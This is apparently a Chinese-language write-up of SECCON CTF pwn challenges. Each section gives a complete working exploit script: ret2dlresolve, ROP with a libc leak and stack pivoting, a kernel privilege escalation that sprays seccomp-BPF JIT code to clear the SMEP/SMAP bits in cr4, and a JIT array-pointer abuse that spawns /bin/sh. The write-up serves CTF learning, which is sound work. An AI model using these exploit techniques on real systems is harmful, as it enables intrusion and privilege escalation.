## Pwn

### kasu bof

```
./chall: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=cb260735eeb00c173f7f530e9fae9ee3704e6c6f, for GNU/Linux 3.2.0, not strippe

// checksec
[*] '/home/u1f383/seccon/kasu_bof/chall'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    
// readelf -d ./chall # resolve function information

Dynamic section at offset 0x2f14 contains 24 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000c (INIT)                       0x8049000
 0x0000000d (FINI)                       0x804922c
 0x00000019 (INIT_ARRAY)                 0x804bf0c
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x0000001a (FINI_ARRAY)                 0x804bf10
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x80481ec
 0x00000005 (STRTAB)                     0x804825c
 0x00000006 (SYMTAB)                     0x804820c
 0x0000000a (STRSZ)                      74 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x804c000
 0x00000002 (PLTRELSZ)                   16 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x80482d8
 0x00000011 (REL)                        0x80482d0
 0x00000012 (RELSZ)                      8 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffe (VERNEED)                    0x80482b0
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x80482a6
 0x00000000 (NULL)                       0x0
```



`JMPREL (0x80482d8) ` section 中存的是 `Elf32_Rel`：

```c
typedef uint32_t Elf32_Addr;
typedef uint32_t Elf32_Word;
typedef struct
{
  Elf32_Addr    r_offset;               /* GOT Address */
  Elf32_Word    r_info;                 /* Relocation type and symbol index */
} Elf32_Rel;
#define ELF32_R_SYM(val) ((val) >> 8)
#define ELF32_R_TYPE(val) ((val) & 0xff)

pwngdb> x/4wx 0x80482d8
0x80482d8:      0x0804c00c      0x00000107
// symbol index == 1
// type         == 7 --> R_386_JUMP_SLOT
```

而 symbol index 對應到的是 `SYMTAB (0x804820c)`，一個 entry 大小是 0x10，結構為：

```c
typedef struct
{
  Elf32_Word    st_name;   /* Symbol name (string tbl index) */
  Elf32_Addr    st_value;  /* Symbol value */
  Elf32_Word    st_size;   /* Symbol size */
  unsigned char st_info;   /* Symbol type and binding */
  unsigned char st_other;  /* Symbol visibility under glibc>=2.2 */
  Elf32_Section st_shndx;  /* Section index */
} Elf32_Sym;
```

lazy binding 時，會呼叫 `_dl_runtime_resolve(link_map, rel_offset)`，而 rel_offset 即是 function 對應到的 `Elf32_Rel` entry index：

```c
// JMPREL == JMPREL (0x80482d8) 
Elf32_Rel * rel_entry = JMPREL + rel_offset;
```

而後 `_dl_runtime_resolve` 會從 `Elf32_Rel` 找 `r_offset` 取得 GOT 位址、從 `r_info` 找到對應 function 的 `Elf32_Sym`：

```c
// ELF32_R_SYM == SYMTAB (0x804820c)
Elf32_Sym *sym_entry = SYMTAB[ELF32_R_SYM(rel_entry->r_info)];
```

取得 sym_entry 後，會拿 symbol name 去 library 找：

```c
// STRTAB == STRTAB (0x804825c)
char *sym_name = STRTAB + sym_entry->st_name;
```

最後填入 `&Elf32_Rel->r_offset`，完成 lazy binding。



而過程中使用到的 segment 皆是 **r--**，因此要構造假的 entry 需要在其他地方構造，不能直接蓋寫，所以需要先用 `gets()` 將相關的 data 寫 .data 段，exploit 如下：

```python
#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) > 1:
    r = remote('hiyoko.quals.seccon.jp', 9001)
else:
    r = process('./chall')

base = 0x804c050
RELent_base = base - 0x80482d8
SYMent_base_add_0xc = (base + 0xc - 0x804820c) // 16
STR_base_add_0x1c = (base + 0x1c - 0x804825c)
sh = base + 0x24
gets_plt = 0x8049040
gets_got = 0x804c00c
pop_ebx_ret = 0x8049022
push_linkmap = 0x8049030
resolve_gets = 0x8049046

payload1 = b'A'*0x88
payload1 += p32(gets_plt) + p32(pop_ebx_ret) + p32(0x804c050)
payload1 += p32(push_linkmap) + p32(RELent_base) + p32(0xdeadbeef) + p32(sh)
r.sendline(payload1)

relent_data = p32(gets_got) + p32((SYMent_base_add_0xc << 8) + 7) + p32(0) # padding to 0xc
syment_data = p32(STR_base_add_0x1c) + p32(0) + p32(0) + p32(0x12)
str_data = b'system\x00\x00'
sh = b'/bin/sh\x00'
payload2 = relent_data + syment_data + str_data + sh
r.sendline(payload2)

r.interactive()
```



### average

```
// file
./average: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6d28335a3d6e903ecf2f8b35567f4339bc2e568a, for GNU/Linux 3.2.0, not stripped

// checksec
[*] '/home/u1f383/seccon/average/average'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

給的 libc version 為 **2.32-0ubuntu3**。



利用很簡單，就是堆 ROP + stack pivoting，而考點的部分我想應該是：透過編譯，變數實際上的位置不一定會跟想像中一樣，因此他雖然給 source，可是實際上變數排序並不與 source 上相同。exploit：

```python
#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) > 1:
    r = remote('average.quals.seccon.jp', 1234)
else:
    #r = process('./average', env={"LD_PRELOAD": "./libc.so.6"})
    r = process('./average')

puts_got = 0x404018
printf_got = 0x404020
scanf_plt = 0x401070
puts_plt = 0x401030

new_stack = 0x404838
lld = 0x402008

pop_rdi_ret = 0x4013a3
pop_rsi_r15_ret = 0x4013a1
ret = 0x40101a
leave_ret = 0x40133e

""" stack 0xa0
A: 0x80
n: 0x8
sum: 0x8
average: 0x8
i: 0x8
"""

r.sendlineafter('n: ', str(16 + 3))
for _ in range(16):
    r.sendlineafter(':', '1')

r.sendlineafter(':', '44') # n
r.sendlineafter(':', '0') # sum
r.sendlineafter(':', '0') # average
r.sendlineafter(':', '19') # i
r.sendlineafter(':', str(new_stack)) # rbp

# leak libc
r.sendlineafter(':', str(pop_rdi_ret))
r.sendlineafter(':', str(puts_got))
r.sendlineafter(':', str(puts_plt))

# alignment
r.sendlineafter(':', str(ret))
# overwrite exit_got to ret
overwrite_queue = []
def overwrite(addr, value):
    r.sendlineafter(':', str(pop_rdi_ret))
    r.sendlineafter(':', str(lld))
    r.sendlineafter(':', str(pop_rsi_r15_ret))
    r.sendlineafter(':', str(addr))
    r.sendlineafter(':', '0')
    r.sendlineafter(':', str(scanf_plt))
    overwrite_queue.append(value)

if len(sys.argv) > 1:
    _system = 0x503c0
    libc_pop_rdi_ret = 0x2858f
    sh = 0x1ae41f
else:
    _system = 0x55410
    libc_pop_rdi_ret = 0x26b72
    sh = 0x1b75aa

# rop chain
overwrite(new_stack + 0x8, libc_pop_rdi_ret)
overwrite(new_stack + 0x10, sh)
overwrite(new_stack + 0x18, _system)

# stack pivoting
r.sendlineafter(':', str(leave_ret))

r.recvuntil('Average =')
r.recvline()
libc = u64(r.recv(6).ljust(8, b'\x00'))
if len(sys.argv) > 1:
    libc -= 0x80d90
else:
    libc -= 0x875a0
info(f"libc: {hex(libc)}")

for i in overwrite_queue:
    r.sendline(str(i + libc))

r.interactive()
```



### gosu bof

```
// file
./chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b62329e4366a9b090c523984a3fd6ffc938fe7dc, for GNU/Linux 3.2.0, not stripped

// checksec
[*] '/home/u1f383/seccon/gosu_bof/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



非預期解：

將 stack pivoting 到 bss 上，並且呼叫 `gets()` 讓 stack 上殘留 libc，之後透過 gadget `add dword ptr [rbp - 0x3d], ebx`，讓 libc 加上 offset 求得 system 位址，之後用同樣的方式做 ROP 即可，exploit 入下：

```python
#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']



if len(sys.argv) > 1:
    r = remote('hiyoko.quals.seccon.jp', 9002)
else:
    r = process('./chall', env={"LD_PRELOAD": "./libc-2.31.so"})

gets_plt = 0x401044
bss = 0x404800

pop_rdi_ret = 0x4011c3
leave_ret = 0x401158
csu_gadget = 0x4011ba
add_dptr_ebx_ret = 0x40111c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
pop_rbp_ret = 0x40111d
ret = 0x40101a

payload1 = b'A'*0x80 + p64(bss - 8)
payload1 += flat(
    pop_rdi_ret, bss,
    gets_plt,
    leave_ret
)

bss_libc = 0x404770
_system_off = 0xffe68c10
payload2 = flat(
    pop_rdi_ret, bss_libc - 0x20,
    gets_plt,
    csu_gadget, _system_off, bss_libc + 0x3d, 0, 0, 0, 0,
    add_dptr_ebx_ret,
    pop_rbp_ret, bss_libc - 0x20,
    leave_ret
)
payload3 = b"/bin/sh\x00" + p64(pop_rdi_ret) + p64(bss_libc - 0x20) + p64(ret)

r.sendline(payload1)
input()
r.sendline(payload2)
input()
r.sendline(payload3)

r.interactive()
```



預期解 & 其他解法：

1. 如果是只能使用 `read()` 的狀況下，由於 syscall 會在 rcx 留下 libc address (`read()` function return address)，而再配合gadget：

   ```
   0x4011b0 : add dword ptr [rax + 0x39], ecx ; fnsave dword ptr [rbp - 0x16] ; add rsp, 8 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
   ```

   與可控 rax 的 function 即可寫入。

2. 將 stack 遷到 bss 時，呼叫 `_start` 也能在 stack 留下 libc address



### kone_gadget

upload.py

```python
#!/usr/bin/python3

from pwn import *
from base64 import b64encode, b64decode
import subprocess
import os

r = remote('niwatori.quals.seccon.jp', 11111)
proc = subprocess.Popen(r.recvline()[:-1].split(b' '), stdout=subprocess.PIPE)
out, _ = proc.communicate()
r.sendlineafter('hashcash token:', out[:-1])

payload = b64encode(open('./rootfs/exp', 'rb').read())
times = 100
part = len(payload) // times
if len(payload) % times != 0:
    times += 1

for i in range(times):
    r.sendlineafter('$', b"echo " + payload[i*part:(i+1)*part] + b" >> /tmp/exp.b64")
    print(b"echo " + payload[i*part:(i+1)*part] + b" >> /tmp/exp.b64")
r.sendlineafter('$', "cat /tmp/exp.b64 | base64 -d > /tmp/exp")
r.interactive()
```



這題 qemu 啟動時有加上 `nokaslr`，因此每次啟動時位址都會相同，除此之外還加了一個自己 implement 的 syscall，接收一個位址為參數並且跳上去執行。而有哪些能夠利用的部分？ kernel mode 應該是沒有 one gadget，但是你可以透過 JIT 相關的 feature 來產生自定義的 shellcode 給 kernel 執行 (因為 `nokaslr`)，透過 unset **cr4** 中 smap 與 smep bit 後，再用 `xchg rax, rsp` 等等 stack pivoting 的 gadget，跳到 usermode 執行 ROP 跑 `commit_creds(&init_cred)` 或 `prepare_kernel_cred(NULL)`，最後執行 `system("/bin/sh")` 即可提權成功。



**非預期解為：**

有一個最簡單的解法，直接給 flag 的位址讓 kernel 直接跳過去執行，再透過 panic message 來 leak flag，exploit：

```c
#include <stdio.h>
#include <unistd.h>

unsigned long flag = 0xFFFFFFFF8228B000;

int main()
{
    syscall(1337, flag);
}
```

flag 位址的找法有：

1. `find 0xffff888000000000,0xffffc87fffffffff,"XXXXXX{sample_flag}\n"`

   直接在 qemu 中搜整塊 physical memory 的 mappings

2. 使用此 gdb [plugin](https://github.com/martinradev/gdb-pt-dump) 並執行 `pt -ss "sample_flag"`

雖然這並不是預期解，不過方向簡單明瞭，還滿有趣的。



**預期解為：**

由於 bpf 可以透過 JIT 的方式產生任意 pattern 的 shellcode 並執行，因此是很好地利用點。然而此 kernel 並不能直接使用 unprivilege bpf，若要執行 JIT code 則需找其他 feature，而參考 [kernel doc](https://www.kernel.org/doc/html/latest/userspace-api/seccomp_filter.html) 能知道若在編譯時有加上 `CONFIG_HAVE_ARCH_SECCOMP_FILTER=y`，則可以透過 `prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, prog);` 的方式來定義 bpf prog 去處理 syscall，exploit：

```c
#include <errno.h>
#include <stdlib.h>
#include <linux/audit.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/unistd.h>
#include <stddef.h>
#include <stdio.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <sys/fcntl.h>
#include <sys/mman.h>

/*
 * Source:
 * https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/filter.h
 * https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/bpf_common.h
 * https://elixir.bootlin.com/linux/latest/source/kernel/sys.c#L2264
 * https://elixir.bootlin.com/linux/latest/source/kernel/seccomp.c#L1798
 * https://elixir.bootlin.com/linux/latest/source/net/core/filter.c#L1403
 * https://elixir.bootlin.com/linux/latest/source/kernel/seccomp.c#L851 (seccomp_attach_filter)
 *
 * Some descriptions:
 * https://www.freebsd.org/cgi/man.cgi?query=bpf&sektion=4&manpath=FreeBSD+4.7-RELEASE
 *
 * Some helpful bps:
 * entry_SYSCALL_64
 * do_syscall_64
 * __x64_sys_prctl
 * prctl_set_seccomp
 * do_seccomp
 * seccomp_set_mode_filter
 * seccomp_prepare_filter
 * bpf_prog_create_from_user
 * bpf_prepare_filter
 * bpf_jit_compile <--- will be jitted, and bpf_prog->bpf_func will point to jitted code
 * and seccomp_filter->prog point to bpf_prog
 */

#define JIT 0xffffffffc0000800
#define NOP (struct sock_filter) BPF_STMT(BPF_LD | BPF_W, 0x1eb9090) // nop ; nop ; jmp .+3
#define RET (struct sock_filter) BPF_STMT(BPF_RET, SECCOMP_RET_ALLOW) // return
#define SC(sc) (struct sock_filter) BPF_STMT(BPF_LD | BPF_W, sc)

unsigned long commit_creds = 0xffffffff81073ad0;
unsigned long prepare_kernel_cred = 0xffffffff81073c60;
unsigned long swapgs_restore_regs_and_return_to_usermode = 0xffffffff81800e10;
unsigned long rop_pop_rdi_ret = 0xffffffff81138833;
unsigned long rop_pop_rax_ret = 0xffffffff81024d31;
unsigned long rop_call_rax_ret = 0xffffffff81febfd3;

size_t user_ss, user_cs, user_rflags, user_sp;
void save_status() {
    __asm__("mov user_ss, ss;"
            "mov user_cs, cs;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("[*] Status has been saved.\n");
}
void getshell()
{
    puts("[*] win");
    system("/bin/sh");
}

int main()
{
    // BPF_ABS: fixed offset
    // BPF_K:   const

    struct sock_filter filter[0x200];
    unsigned long *stack;
    int i = 0, j = 0x1000 / 8;

    // spray
    for (; i < 0x180; i++)
        filter[i] = NOP;
    // create ROP stack
    stack = mmap((unsigned long *) ((1 << 16) - 0x1000), 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC,
                MAP_POPULATE | MAP_ANONYMOUS | MAP_SHARED | MAP_FIXED, -1, 0);
    save_status();

    stack[0] = 0xdeadbeef;
    // prepare_kernel_cred(0)
    stack[j++] = prepare_kernel_cred;
    // commit_creds(output)
    stack[j++] = commit_creds;
    // swapgs_restore_regs_and_return_to_usermode
    stack[j++] = swapgs_restore_regs_and_return_to_usermode + 0x16;
    stack[j++] = 0; // pop rax
    stack[j++] = 0; // pop rdi
    // recover usermode register
    stack[j++] = (unsigned long) getshell;
    stack[j++] = user_cs;
    stack[j++] = user_rflags;
    stack[j++] = user_sp;
    stack[j++] = user_ss;
    printf("[*] shell: %p\n", getshell);

    // step1: unset smep, smap bit in cr4 (20b and 21b)
    // cr4 &= ~( (0b11 << 20) - 1 )
    filter[i++] = SC(0x04e7200f); // mov rdi, cr4 ; add al, XX
    filter[i++] = SC(0x01ebd231); // xor edx, edx ; jmp .+3
    // edx = 1
    filter[i++] = SC(0x01ebc2ff); // inc edx; ; jmp .+3
    // edx <<= 22
    filter[i++] = SC(0x0414e2c1); // shl edx, 22 ; add al, XX
    // edx -= 1
    filter[i++] = SC(0x01ebcaff); // dec edx ; jmp .+3
    // edi &= edx
    filter[i++] = SC(0x01ebd721); // and edi, edx ; jmp .+3
    // cr4 = rdi
    filter[i++] = SC(0x04e7220f); // mov cr4, rdi ; add al, XX

    // step2: stack pivoting
    // esp = 0
    filter[i++] = SC(0x01ebe431); // xor esp, esp ; jmp .+3
    // esp = 1
    filter[i++] = SC(0x01ebc4ff); // inc esp ; jmp .+3
    // esp <<= 31
    filter[i++] = SC(0x0410e4c1); // shl esp, 16 ; add al, XX

    // step3: prepare_kernel_cred(0)
    filter[i++] = SC(0x01ebff31); // xor, edi, edi ; jmp .+3
    filter[i++] = SC(0x01eb9058); // pop rax ; nop ; jmp .+3
    filter[i++] = SC(0x01ebd0ff); // call rax ; jmp .+3

    // step4: commit_creds(output)
    filter[i++] = SC(0x04c78948); // mov rdi, rax ; add al, XX
    filter[i++] = SC(0x01eb9058); // pop rax ; nop ; jmp .+3
    filter[i++] = SC(0x01ebd0ff); // call rax ; jmp .+3

    // step5: finally return to usermode and run system("/bin/sh")
    filter[i++] = SC(0x04e0ff58); // pop rax ; jmp rax ; all al, XX

    // match the rules
    filter[i++] = RET;

    struct sock_fprog prog = {
        .len = i,
        .filter = filter,
    };

    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) == -1)
        perror("[*] PR_SET_NO_NEW_PRIVS failed");
    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog) == -1)
        perror("[*] SECCOMP_MODE_FILTER failed");

    syscall(1337, JIT);
    return 0;
}
```



Others.

1. 若 rootfs 在 loading 時需要 root 權限，則在 compress 時要加上 `--owner root` 的 flag
2. `/proc/sys/net/core/bpf_jit_enable` 可以檢查 bpf 能不能夠被 JIT
3. `/proc/sys/kernel/unprivileged_bpf_disabled` 可以檢查是否能執行
4. [kernel doc](https://www.kernel.org/doc/html/latest/admin-guide/sysctl/kernel.html) 描述有許多在 `/proc/sys/` 下的設定
5. 不確定為什麼把 rootfs unpack 壓回去時，`find` 印出的檔案順序與作者的不同，導致 flag 對到的位址不相同



### pyast64++.pwn

題目使用了 github 上某個做 JIT python code 的 [repo](http://benhoyt.com/writings/pyast64/)，而此 JIT 的實作並沒有考慮到離開 stack frame 後的 array pointer 仍可以被取得，並且關於 canary 以及 length 的資訊也沒有被清除，並且我們還能對 pointer 做一些加減運算得到任意的 pointer。

因此我們可以先透過 function `put_canary()` 構造一個很大的 array，在 stack 殘留下他的 array info (canary 以及 length `0x20`)，而後我們透過一個 `exp_wrapper()` 將 stack 先往上一些，實際在 `exp()` 時透過 array pointer 的減法使得 `x` 指向 `put_canary()` 所殘留的 array info，這樣就能通過檢查。之後透過 `x[idx]` 就可以取得 stack 當中任意位址的值，雖然能夠用 `getc()` 做 leak，但是這邊直接用已知的位址做加法得到我們在 main 所構造的 ROP gadget，並且直接在 stack 上構造 `"/bin/sh"`，最後透過 ROP chain 執行 `sys_execve("/bin/sh", NULL, NULL)`，exploit 如下：

```python
def put_canary():
    owo = array(0x20)
    owo[0] = 0xc0ffee

def exp():
    binsh = array(1)
    binsh[0] = ((((0x6873 * 0x10000) + 0x2f6e) * 0x10000) + 0x6962) * 0x100 + 0x2f
    x = binsh - 0x28
    # x[10] is return address
    x[11] = x[9] + 8 # addr of /bin/sh
    x[12] = x[10] + 37 # pop rsi ; ret
    x[13] = 0
    x[14] = x[10] + 45 # pop rdx ; ret
    x[15] = 0
    x[16] = x[10] + 53 # pop rax ; ret
    x[17] = 0x3b
    x[18] = x[10] + 84 # syscall
    x[10] = x[10] + 29 # pop rdi ; ret

def exp_wrapper():
    dummp = array(0x14) # make rsp lower
    exp()

def main():
    # create ROP gadget
    pop_rdi_ret = 0xc35f
    pop_rsi_ret = 0xc35e
    pop_rdx_ret = 0xc35a
    pop_rax_ret = 0xc358

    put_canary()
    exp_wrapper()
```

P.S. 這題一開始找到可以對 array pointer 做操作後，想法是利用 function 能夠回傳存在於 callee 的 stack frame 的 pointer 給 caller，而後能做一些操作來控制程式執行流程，不過後來沒想到做法，所以參考他人 writeup 來寫此 exploit

